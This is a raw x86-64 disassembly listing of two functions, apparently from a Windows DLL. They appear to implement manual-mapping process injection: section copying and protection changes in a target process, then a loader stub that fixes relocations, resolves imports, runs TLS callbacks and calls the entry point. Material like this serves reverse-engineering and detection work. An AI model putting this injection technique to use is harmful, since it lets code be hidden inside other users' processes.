   180002bf5:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   180002bfb:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002c00:	4d 8b c6             	mov    %r14,%r8
   180002c03:	49 8b d4             	mov    %r12,%rdx
   180002c06:	48 8b cf             	mov    %rdi,%rcx
   180002c09:	ff 15 29 24 00 00    	call   *0x2429(%rip)        # 0x180005038
   180002c0f:	85 c0                	test   %eax,%eax
   180002c11:	75 0c                	jne    0x180002c1f
   180002c13:	48 8d 0d fe 2a 00 00 	lea    0x2afe(%rip),%rcx        # 0x180005718
   180002c1a:	e8 21 fa ff ff       	call   0x180002640
   180002c1f:	41 0f b7 5f 14       	movzwl 0x14(%r15),%ebx
   180002c24:	33 f6                	xor    %esi,%esi
   180002c26:	41 0f b7 4f 06       	movzwl 0x6(%r15),%ecx
   180002c2b:	48 83 c3 18          	add    $0x18,%rbx
   180002c2f:	49 03 df             	add    %r15,%rbx
   180002c32:	66 85 c9             	test   %cx,%cx
   180002c35:	0f 84 c7 00 00 00    	je     0x180002d02
   180002c3b:	48 8d 15 f6 2a 00 00 	lea    0x2af6(%rip),%rdx        # 0x180005738
   180002c42:	4c 8d 05 f7 2a 00 00 	lea    0x2af7(%rip),%r8        # 0x180005740
   180002c49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180002c50:	83 7b 08 00          	cmpl   $0x0,0x8(%rbx)
   180002c54:	0f 84 92 00 00 00    	je     0x180002cec
   180002c5a:	33 c9                	xor    %ecx,%ecx
   180002c5c:	0f 1f 40 00          	nopl   0x0(%rax)
   180002c60:	0f b6 04 0b          	movzbl (%rbx,%rcx,1),%eax
   180002c64:	48 ff c1             	inc    %rcx
   180002c67:	3a 44 0a ff          	cmp    -0x1(%rdx,%rcx,1),%al
   180002c6b:	75 08                	jne    0x180002c75
   180002c6d:	48 83 f9 06          	cmp    $0x6,%rcx
   180002c71:	75 ed                	jne    0x180002c60
   180002c73:	eb 1f                	jmp    0x180002c94
   180002c75:	33 c9                	xor    %ecx,%ecx
   180002c77:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180002c7e:	00 00 
   180002c80:	0f b6 04 0b          	movzbl (%rbx,%rcx,1),%eax
   180002c84:	48 ff c1             	inc    %rcx
   180002c87:	41 3a 44 08 ff       	cmp    -0x1(%r8,%rcx,1),%al
   180002c8c:	75 5e                	jne    0x180002cec
   180002c8e:	48 83 f9 07          	cmp    $0x7,%rcx
   180002c92:	75 ec                	jne    0x180002c80
   180002c94:	48 8b d3             	mov    %rbx,%rdx
   180002c97:	48 8d 0d aa 2a 00 00 	lea    0x2aaa(%rip),%rcx        # 0x180005748
   180002c9e:	e8 9d f9 ff ff       	call   0x180002640
   180002ca3:	8b 53 0c             	mov    0xc(%rbx),%edx
   180002ca6:	4d 8b c6             	mov    %r14,%r8
   180002ca9:	44 8b 4b 08          	mov    0x8(%rbx),%r9d
   180002cad:	49 03 d4             	add    %r12,%rdx
   180002cb0:	48 8b cf             	mov    %rdi,%rcx
   180002cb3:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180002cba:	00 00 
   180002cbc:	ff 15 76 23 00 00    	call   *0x2376(%rip)        # 0x180005038
   180002cc2:	85 c0                	test   %eax,%eax
   180002cc4:	75 18                	jne    0x180002cde
   180002cc6:	ff 15 7c 23 00 00    	call   *0x237c(%rip)        # 0x180005048
   180002ccc:	48 8b d3             	mov    %rbx,%rdx
   180002ccf:	48 8d 0d 8a 2a 00 00 	lea    0x2a8a(%rip),%rcx        # 0x180005760
   180002cd6:	44 8b c0             	mov    %eax,%r8d
   180002cd9:	e8 62 f9 ff ff       	call   0x180002640
   180002cde:	4c 8d 05 5b 2a 00 00 	lea    0x2a5b(%rip),%r8        # 0x180005740
   180002ce5:	48 8d 15 4c 2a 00 00 	lea    0x2a4c(%rip),%rdx        # 0x180005738
   180002cec:	41 0f b7 47 06       	movzwl 0x6(%r15),%eax
   180002cf1:	ff c6                	inc    %esi
   180002cf3:	48 83 c3 28          	add    $0x28,%rbx
   180002cf7:	3b f0                	cmp    %eax,%esi
   180002cf9:	0f 85 51 ff ff ff    	jne    0x180002c50
   180002cff:	0f b7 c8             	movzwl %ax,%ecx
   180002d02:	41 0f b7 5f 14       	movzwl 0x14(%r15),%ebx
   180002d07:	45 33 f6             	xor    %r14d,%r14d
   180002d0a:	48 83 c3 18          	add    $0x18,%rbx
   180002d0e:	49 03 df             	add    %r15,%rbx
   180002d11:	66 85 c9             	test   %cx,%cx
   180002d14:	0f 84 83 00 00 00    	je     0x180002d9d
   180002d1a:	ba 20 00 00 00       	mov    $0x20,%edx
   180002d1f:	90                   	nop
   180002d20:	8b 4b 08             	mov    0x8(%rbx),%ecx
   180002d23:	85 c9                	test   %ecx,%ecx
   180002d25:	74 65                	je     0x180002d8c
   180002d27:	8b 43 24             	mov    0x24(%rbx),%eax
   180002d2a:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
   180002d31:	a9 00 00 00 80       	test   $0x80000000,%eax
   180002d36:	76 07                	jbe    0x180002d3f
   180002d38:	be 04 00 00 00       	mov    $0x4,%esi
   180002d3d:	eb 0d                	jmp    0x180002d4c
   180002d3f:	a9 00 00 00 20       	test   $0x20000000,%eax
   180002d44:	be 02 00 00 00       	mov    $0x2,%esi
   180002d49:	0f 47 f2             	cmova  %edx,%esi
   180002d4c:	8b 53 0c             	mov    0xc(%rbx),%edx
   180002d4f:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   180002d53:	4c 8b c1             	mov    %rcx,%r8
   180002d56:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002d5b:	49 03 d4             	add    %r12,%rdx
   180002d5e:	44 8b ce             	mov    %esi,%r9d
   180002d61:	48 8b cf             	mov    %rdi,%rcx
   180002d64:	ff 15 ee 22 00 00    	call   *0x22ee(%rip)        # 0x180005058
   180002d6a:	44 8b c6             	mov    %esi,%r8d
   180002d6d:	48 8d 0d 0c 2a 00 00 	lea    0x2a0c(%rip),%rcx        # 0x180005780
   180002d74:	48 8b d3             	mov    %rbx,%rdx
   180002d77:	85 c0                	test   %eax,%eax
   180002d79:	75 07                	jne    0x180002d82
   180002d7b:	48 8d 0d 16 2a 00 00 	lea    0x2a16(%rip),%rcx        # 0x180005798
   180002d82:	e8 b9 f8 ff ff       	call   0x180002640
   180002d87:	ba 20 00 00 00       	mov    $0x20,%edx
   180002d8c:	41 0f b7 47 06       	movzwl 0x6(%r15),%eax
   180002d91:	41 ff c6             	inc    %r14d
   180002d94:	48 83 c3 28          	add    $0x28,%rbx
   180002d98:	44 3b f0             	cmp    %eax,%r14d
   180002d9b:	75 83                	jne    0x180002d20
   180002d9d:	41 0f b7 47 14       	movzwl 0x14(%r15),%eax
   180002da2:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   180002da8:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%rbp)
   180002daf:	49 8b d4             	mov    %r12,%rdx
   180002db2:	48 8b cf             	mov    %rdi,%rcx
   180002db5:	46 8b 44 38 24       	mov    0x24(%rax,%r15,1),%r8d
   180002dba:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   180002dbe:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002dc3:	ff 15 8f 22 00 00    	call   *0x228f(%rip)        # 0x180005058
   180002dc9:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180002dce:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   180002dd4:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   180002dd9:	48 8b d3             	mov    %rbx,%rdx
   180002ddc:	48 8b cf             	mov    %rdi,%rcx
   180002ddf:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180002de6:	00 00 
   180002de8:	ff 15 4a 22 00 00    	call   *0x224a(%rip)        # 0x180005038
   180002dee:	85 c0                	test   %eax,%eax
   180002df0:	75 0c                	jne    0x180002dfe
   180002df2:	48 8d 0d c7 29 00 00 	lea    0x29c7(%rip),%rcx        # 0x1800057c0
   180002df9:	e8 42 f8 ff ff       	call   0x180002640
   180002dfe:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180002e04:	45 33 c0             	xor    %r8d,%r8d
   180002e07:	48 8b d3             	mov    %rbx,%rdx
   180002e0a:	48 8b cf             	mov    %rdi,%rcx
   180002e0d:	ff 15 6d 22 00 00    	call   *0x226d(%rip)        # 0x180005080
   180002e13:	85 c0                	test   %eax,%eax
   180002e15:	75 0c                	jne    0x180002e23
   180002e17:	48 8d 0d c2 29 00 00 	lea    0x29c2(%rip),%rcx        # 0x1800057e0
   180002e1e:	e8 1d f8 ff ff       	call   0x180002640
   180002e23:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180002e29:	45 33 c0             	xor    %r8d,%r8d
   180002e2c:	49 8b d5             	mov    %r13,%rdx
   180002e2f:	48 8b cf             	mov    %rdi,%rcx
   180002e32:	ff 15 48 22 00 00    	call   *0x2248(%rip)        # 0x180005080
   180002e38:	85 c0                	test   %eax,%eax
   180002e3a:	75 0c                	jne    0x180002e48
   180002e3c:	48 8d 0d cd 29 00 00 	lea    0x29cd(%rip),%rcx        # 0x180005810
   180002e43:	e8 f8 f7 ff ff       	call   0x180002640
   180002e48:	b0 01                	mov    $0x1,%al
   180002e4a:	eb 1f                	jmp    0x180002e6b
   180002e4c:	48 8d 0d 65 28 00 00 	lea    0x2865(%rip),%rcx        # 0x1800056b8
   180002e53:	e8 e8 f7 ff ff       	call   0x180002640
   180002e58:	e9 b7 fb ff ff       	jmp    0x180002a14
   180002e5d:	48 8d 0d 34 28 00 00 	lea    0x2834(%rip),%rcx        # 0x180005698
   180002e64:	e8 d7 f7 ff ff       	call   0x180002640
   180002e69:	32 c0                	xor    %al,%al
   180002e6b:	48 8b b4 24 08 01 00 	mov    0x108(%rsp),%rsi
   180002e72:	00 
   180002e73:	48 8b 9c 24 40 01 00 	mov    0x140(%rsp),%rbx
   180002e7a:	00 
   180002e7b:	4c 8b ac 24 f8 00 00 	mov    0xf8(%rsp),%r13
   180002e82:	00 
   180002e83:	4c 8b a4 24 00 01 00 	mov    0x100(%rsp),%r12
   180002e8a:	00 
   180002e8b:	4c 8b bc 24 f0 00 00 	mov    0xf0(%rsp),%r15
   180002e92:	00 
   180002e93:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   180002e97:	48 33 cc             	xor    %rsp,%rcx
   180002e9a:	e8 21 05 00 00       	call   0x1800033c0
   180002e9f:	48 81 c4 10 01 00 00 	add    $0x110,%rsp
   180002ea6:	41 5e                	pop    %r14
   180002ea8:	5f                   	pop    %rdi
   180002ea9:	5d                   	pop    %rbp
   180002eaa:	c3                   	ret
   180002eab:	cc                   	int3
   180002eac:	cc                   	int3
   180002ead:	cc                   	int3
   180002eae:	cc                   	int3
   180002eaf:	cc                   	int3
   180002eb0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002eb5:	48 81 ec e8 00 00 00 	sub    $0xe8,%rsp
   180002ebc:	48 83 bc 24 f0 00 00 	cmpq   $0x0,0xf0(%rsp)
   180002ec3:	00 00 
   180002ec5:	75 15                	jne    0x180002edc
   180002ec7:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180002ece:	00 
   180002ecf:	48 c7 40 20 40 40 40 	movq   $0x404040,0x20(%rax)
   180002ed6:	00 
   180002ed7:	e9 bd 04 00 00       	jmp    0x180003399
   180002edc:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180002ee3:	00 
   180002ee4:	48 8b 40 18          	mov    0x18(%rax),%rax
   180002ee8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180002eed:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180002ef2:	48 63 40 3c          	movslq 0x3c(%rax),%rax
   180002ef6:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180002efb:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
   180002f00:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180002f05:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180002f0c:	00 
   180002f0d:	48 8b 00             	mov    (%rax),%rax
   180002f10:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
   180002f17:	00 
   180002f18:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180002f1f:	00 
   180002f20:	48 8b 40 08          	mov    0x8(%rax),%rax
   180002f24:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   180002f2b:	00 
   180002f2c:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180002f33:	00 
   180002f34:	48 8b 40 10          	mov    0x10(%rax),%rax
   180002f38:	48 89 84 24 c8 00 00 	mov    %rax,0xc8(%rsp)
   180002f3f:	00 
   180002f40:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180002f45:	8b 40 10             	mov    0x10(%rax),%eax
   180002f48:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180002f4d:	48 03 c8             	add    %rax,%rcx
   180002f50:	48 8b c1             	mov    %rcx,%rax
   180002f53:	48 89 84 24 d0 00 00 	mov    %rax,0xd0(%rsp)
   180002f5a:	00 
   180002f5b:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   180002f60:	48 8b 40 18          	mov    0x18(%rax),%rax
   180002f64:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180002f69:	48 2b c8             	sub    %rax,%rcx
   180002f6c:	48 8b c1             	mov    %rcx,%rax
   180002f6f:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   180002f76:	00 
   180002f77:	48 83 bc 24 80 00 00 	cmpq   $0x0,0x80(%rsp)
   180002f7e:	00 00 
   180002f80:	0f 84 51 01 00 00    	je     0x1800030d7
   180002f86:	b8 08 00 00 00       	mov    $0x8,%eax
   180002f8b:	48 6b c0 05          	imul   $0x5,%rax,%rax
   180002f8f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180002f94:	83 7c 01 74 00       	cmpl   $0x0,0x74(%rcx,%rax,1)
   180002f99:	0f 84 38 01 00 00    	je     0x1800030d7
   180002f9f:	b8 08 00 00 00       	mov    $0x8,%eax
   180002fa4:	48 6b c0 05          	imul   $0x5,%rax,%rax
   180002fa8:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180002fad:	8b 44 01 70          	mov    0x70(%rcx,%rax,1),%eax
   180002fb1:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180002fb6:	48 03 c8             	add    %rax,%rcx
   180002fb9:	48 8b c1             	mov    %rcx,%rax
   180002fbc:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180002fc1:	b8 08 00 00 00       	mov    $0x8,%eax
   180002fc6:	48 6b c0 05          	imul   $0x5,%rax,%rax
   180002fca:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180002fcf:	8b 44 01 74          	mov    0x74(%rcx,%rax,1),%eax
   180002fd3:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   180002fd8:	48 03 c8             	add    %rax,%rcx
   180002fdb:	48 8b c1             	mov    %rcx,%rax
   180002fde:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
   180002fe5:	00 
   180002fe6:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   180002fed:	00 
   180002fee:	48 39 44 24 38       	cmp    %rax,0x38(%rsp)
   180002ff3:	0f 83 de 00 00 00    	jae    0x1800030d7
   180002ff9:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180002ffe:	83 78 04 00          	cmpl   $0x0,0x4(%rax)
   180003002:	0f 84 cf 00 00 00    	je     0x1800030d7
   180003008:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   18000300d:	8b 40 04             	mov    0x4(%rax),%eax
   180003010:	48 83 e8 08          	sub    $0x8,%rax
   180003014:	33 d2                	xor    %edx,%edx
   180003016:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000301b:	48 f7 f1             	div    %rcx
   18000301e:	89 44 24 70          	mov    %eax,0x70(%rsp)
   180003022:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003027:	48 83 c0 08          	add    $0x8,%rax
   18000302b:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   180003030:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   180003037:	00 
   180003038:	eb 18                	jmp    0x180003052
   18000303a:	8b 44 24 48          	mov    0x48(%rsp),%eax
   18000303e:	ff c0                	inc    %eax
   180003040:	89 44 24 48          	mov    %eax,0x48(%rsp)
   180003044:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180003049:	48 83 c0 02          	add    $0x2,%rax
   18000304d:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   180003052:	8b 44 24 70          	mov    0x70(%rsp),%eax
   180003056:	39 44 24 48          	cmp    %eax,0x48(%rsp)
   18000305a:	74 5e                	je     0x1800030ba
   18000305c:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180003061:	0f b7 00             	movzwl (%rax),%eax
   180003064:	c1 f8 0c             	sar    $0xc,%eax
   180003067:	83 f8 0a             	cmp    $0xa,%eax
   18000306a:	75 4c                	jne    0x1800030b8
   18000306c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003071:	8b 00                	mov    (%rax),%eax
   180003073:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003078:	48 03 c8             	add    %rax,%rcx
   18000307b:	48 8b c1             	mov    %rcx,%rax
   18000307e:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   180003083:	0f b7 09             	movzwl (%rcx),%ecx
   180003086:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
   18000308c:	48 63 c9             	movslq %ecx,%rcx
   18000308f:	48 03 c1             	add    %rcx,%rax
   180003092:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
   180003099:	00 
   18000309a:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   1800030a1:	00 
   1800030a2:	48 8b 00             	mov    (%rax),%rax
   1800030a5:	48 03 84 24 80 00 00 	add    0x80(%rsp),%rax
   1800030ac:	00 
   1800030ad:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   1800030b4:	00 
   1800030b5:	48 89 01             	mov    %rax,(%rcx)
   1800030b8:	eb 80                	jmp    0x18000303a
   1800030ba:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1800030bf:	8b 40 04             	mov    0x4(%rax),%eax
   1800030c2:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1800030c7:	48 03 c8             	add    %rax,%rcx
   1800030ca:	48 8b c1             	mov    %rcx,%rax
   1800030cd:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800030d2:	e9 0f ff ff ff       	jmp    0x180002fe6
   1800030d7:	b8 08 00 00 00       	mov    $0x8,%eax
   1800030dc:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1800030e0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1800030e5:	83 7c 01 74 00       	cmpl   $0x0,0x74(%rcx,%rax,1)
   1800030ea:	0f 84 6e 01 00 00    	je     0x18000325e
   1800030f0:	b8 08 00 00 00       	mov    $0x8,%eax
   1800030f5:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1800030f9:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1800030fe:	8b 44 01 70          	mov    0x70(%rcx,%rax,1),%eax
   180003102:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003107:	48 03 c8             	add    %rax,%rcx
   18000310a:	48 8b c1             	mov    %rcx,%rax
   18000310d:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180003112:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180003117:	83 78 0c 00          	cmpl   $0x0,0xc(%rax)
   18000311b:	0f 84 3d 01 00 00    	je     0x18000325e
   180003121:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180003126:	8b 40 0c             	mov    0xc(%rax),%eax
   180003129:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   18000312e:	48 03 c8             	add    %rax,%rcx
   180003131:	48 8b c1             	mov    %rcx,%rax
   180003134:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
   18000313b:	00 
   18000313c:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
   180003143:	00 
   180003144:	ff 94 24 b0 00 00 00 	call   *0xb0(%rsp)
   18000314b:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   180003152:	00 
   180003153:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180003158:	8b 00                	mov    (%rax),%eax
   18000315a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   18000315f:	48 03 c8             	add    %rax,%rcx
   180003162:	48 8b c1             	mov    %rcx,%rax
   180003165:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   18000316a:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   18000316f:	8b 40 10             	mov    0x10(%rax),%eax
   180003172:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003177:	48 03 c8             	add    %rax,%rcx
   18000317a:	48 8b c1             	mov    %rcx,%rax
   18000317d:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180003182:	48 83 7c 24 40 00    	cmpq   $0x0,0x40(%rsp)
   180003188:	75 0a                	jne    0x180003194
   18000318a:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   18000318f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003194:	eb 1c                	jmp    0x1800031b2
   180003196:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   18000319b:	48 83 c0 08          	add    $0x8,%rax
   18000319f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800031a4:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   1800031a9:	48 83 c0 08          	add    $0x8,%rax
   1800031ad:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1800031b2:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1800031b7:	48 83 38 00          	cmpq   $0x0,(%rax)
   1800031bb:	0f 84 8a 00 00 00    	je     0x18000324b
   1800031c1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1800031c6:	48 b9 00 00 00 00 00 	movabs $0x8000000000000000,%rcx
   1800031cd:	00 00 80 
   1800031d0:	48 8b 00             	mov    (%rax),%rax
   1800031d3:	48 23 c1             	and    %rcx,%rax
   1800031d6:	48 85 c0             	test   %rax,%rax
   1800031d9:	74 2a                	je     0x180003205
   1800031db:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1800031e0:	48 8b 00             	mov    (%rax),%rax
   1800031e3:	48 25 ff ff 00 00    	and    $0xffff,%rax
   1800031e9:	48 8b d0             	mov    %rax,%rdx
   1800031ec:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   1800031f3:	00 
   1800031f4:	ff 94 24 98 00 00 00 	call   *0x98(%rsp)
   1800031fb:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180003200:	48 89 01             	mov    %rax,(%rcx)
   180003203:	eb 41                	jmp    0x180003246
   180003205:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   18000320a:	48 8b 00             	mov    (%rax),%rax
   18000320d:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003212:	48 03 c8             	add    %rax,%rcx
   180003215:	48 8b c1             	mov    %rcx,%rax
   180003218:	48 89 84 24 b8 00 00 	mov    %rax,0xb8(%rsp)
   18000321f:	00 
   180003220:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   180003227:	00 
   180003228:	48 83 c0 02          	add    $0x2,%rax
   18000322c:	48 8b d0             	mov    %rax,%rdx
   18000322f:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   180003236:	00 
   180003237:	ff 94 24 98 00 00 00 	call   *0x98(%rsp)
   18000323e:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180003243:	48 89 01             	mov    %rax,(%rcx)
   180003246:	e9 4b ff ff ff       	jmp    0x180003196
   18000324b:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   180003250:	48 83 c0 14          	add    $0x14,%rax
   180003254:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180003259:	e9 b4 fe ff ff       	jmp    0x180003112
   18000325e:	b8 08 00 00 00       	mov    $0x8,%eax
   180003263:	48 6b c0 09          	imul   $0x9,%rax,%rax
   180003267:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000326c:	83 7c 01 74 00       	cmpl   $0x0,0x74(%rcx,%rax,1)
   180003271:	74 70                	je     0x1800032e3
   180003273:	b8 08 00 00 00       	mov    $0x8,%eax
   180003278:	48 6b c0 09          	imul   $0x9,%rax,%rax
   18000327c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003281:	8b 44 01 70          	mov    0x70(%rcx,%rax,1),%eax
   180003285:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   18000328a:	48 03 c8             	add    %rax,%rcx
   18000328d:	48 8b c1             	mov    %rcx,%rax
   180003290:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   180003297:	00 
   180003298:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   18000329f:	00 
   1800032a0:	48 8b 40 18          	mov    0x18(%rax),%rax
   1800032a4:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800032a9:	eb 0e                	jmp    0x1800032b9
   1800032ab:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1800032b0:	48 83 c0 08          	add    $0x8,%rax
   1800032b4:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800032b9:	48 83 7c 24 60 00    	cmpq   $0x0,0x60(%rsp)
   1800032bf:	74 22                	je     0x1800032e3
   1800032c1:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1800032c6:	48 83 38 00          	cmpq   $0x0,(%rax)
   1800032ca:	74 17                	je     0x1800032e3
   1800032cc:	45 33 c0             	xor    %r8d,%r8d
   1800032cf:	ba 01 00 00 00       	mov    $0x1,%edx
   1800032d4:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1800032d9:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   1800032de:	ff 10                	call   *(%rax)
   1800032e0:	90                   	nop
   1800032e1:	eb c8                	jmp    0x1800032ab
   1800032e3:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   1800032e8:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   1800032ef:	00 
   1800032f0:	83 78 38 00          	cmpl   $0x0,0x38(%rax)
   1800032f4:	74 53                	je     0x180003349
   1800032f6:	b8 08 00 00 00       	mov    $0x8,%eax
   1800032fb:	48 6b c0 03          	imul   $0x3,%rax,%rax
   1800032ff:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180003304:	48 8b 44 01 70       	mov    0x70(%rcx,%rax,1),%rax
   180003309:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   18000330e:	83 7c 24 7c 00       	cmpl   $0x0,0x7c(%rsp)
   180003313:	74 34                	je     0x180003349
   180003315:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
   180003319:	33 d2                	xor    %edx,%edx
   18000331b:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180003320:	48 f7 f1             	div    %rcx
   180003323:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   180003327:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   18000332c:	48 03 d1             	add    %rcx,%rdx
   18000332f:	48 8b ca             	mov    %rdx,%rcx
   180003332:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   180003337:	8b d0                	mov    %eax,%edx
   180003339:	ff 94 24 c8 00 00 00 	call   *0xc8(%rsp)
   180003340:	85 c0                	test   %eax,%eax
   180003342:	75 05                	jne    0x180003349
   180003344:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   180003349:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   180003350:	00 
   180003351:	4c 8b 40 30          	mov    0x30(%rax),%r8
   180003355:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   18000335c:	00 
   18000335d:	8b 50 28             	mov    0x28(%rax),%edx
   180003360:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003365:	ff 94 24 d0 00 00 00 	call   *0xd0(%rsp)
   18000336c:	90                   	nop
   18000336d:	0f b6 44 24 20       	movzbl 0x20(%rsp),%eax
   180003372:	85 c0                	test   %eax,%eax
   180003374:	74 12                	je     0x180003388
   180003376:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   18000337d:	00 
   18000337e:	48 c7 40 20 50 50 50 	movq   $0x505050,0x20(%rax)
   180003385:	00 
   180003386:	eb 11                	jmp    0x180003399
   180003388:	48 8b 84 24 f0 00 00 	mov    0xf0(%rsp),%rax
   18000338f:	00 
   180003390:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180003395:	48 89 48 20          	mov    %rcx,0x20(%rax)
   180003399:	48 81 c4 e8 00 00 00 	add    $0xe8,%rsp
   1800033a0:	c3                   	ret
   1800033a1:	cc                   	int3
   1800033a2:	cc                   	int3
   1800033a3:	cc                   	int3
   1800033a4:	cc                   	int3
   1800033a5:	cc                   	int3
   1800033a6:	cc                   	int3
   1800033a7:	cc                   	int3
   1800033a8:	cc                   	int3
   1800033a9:	cc                   	int3
